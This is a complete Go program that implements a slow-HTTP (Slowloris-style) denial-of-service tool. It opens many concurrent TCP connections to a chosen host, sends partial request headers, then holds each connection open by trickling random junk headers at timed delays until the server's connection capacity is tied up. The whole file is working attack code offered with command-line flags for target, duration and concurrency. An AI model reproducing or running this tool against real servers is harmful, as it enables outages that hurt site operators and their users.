package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"strings"
	"sync"
	"time"
)

func main() {
	flag.Parse()
	wg := new(sync.WaitGroup)
	addr := fmt.Sprintf("%s:%s", *host, *port)
	defer fmt.Printf("\n") // end on a newline ;-)
	c_ch := make(chan int, *num_workers)
	for i := int64(0); i < *num_requests; i++ {
    wg.Add(1)
		go func() { dragRequest(addr, *seconds, wg, c_ch) }()
	}
	wg.Wait()
}

var (
	host         = flag.String("host", "127.0.0.1", "host address to connect to")
	port         = flag.String("port", "8080", "host port to connect to")
	seconds      = flag.Int64("secs", 30, "number seconds to stretch request to")
	max_delay    = flag.Int64("delay", 10, "maximum delay between sending additional headers")
	num_requests = flag.Int64("n", 1, "number of requests to make (total)")
	num_workers  = flag.Int64("c", 1, "concurrency of the requests")
	headers      = []string{
		"GET / HTTP/1.1\r\n",
		"User-agent: drag-ass/1.0\r\n",
		"Connection: Keep-Alive\r\n",
		"Accept: */*\r\n",
	}
)

func dragRequest(addr string, seconds int64, wg *sync.WaitGroup, ch chan int) {
	ch <- 1
	defer wg.Done()
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	// get the time _after_ we're connected, so we actually hold the connection this long
	end_t := time.Now().Add(time.Duration(seconds) * time.Second)

	for _, header := range headers {
		fmt.Fprintf(conn, header)
		fmt.Printf(".")
	}
	for end_t.After(time.Now()) {
		fmt.Fprintf(conn, bunkHeader())
		fmt.Printf(".")
		time.Sleep(time.Duration(time.Duration(*max_delay)) * time.Second)
	}

	// finally finish
	fmt.Fprintf(conn, "\r\n")
	status, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		log.Fatal(err)
	}

	// output some resemblance of pass or fail, in a single character (because of goroutines)
	if strings.Contains(status, "200 OK") {
		fmt.Printf("+")
	} else {
		fmt.Printf("-")
	}
	<-ch
}

// generate a formatted header, but is total non-sense
func bunkHeader() string {
	return fmt.Sprintf("%s: %s\r\n", word(), word())
}

// garbage non-sense
func word() string {
	length := rand.Intn(20)
	buf := []rune{}
	for i := 0; i < length; i++ {
		buf = append(buf, rune(randLetter()))
	}
	return string(buf)
}

// only the of lower case characters
func randLetter() rune {
	var r int
	for r < 97 {
		r = rand.Intn(122)
	}
	return rune(r)
}

func init() {
	rand.Seed(time.Now().UnixNano())
}
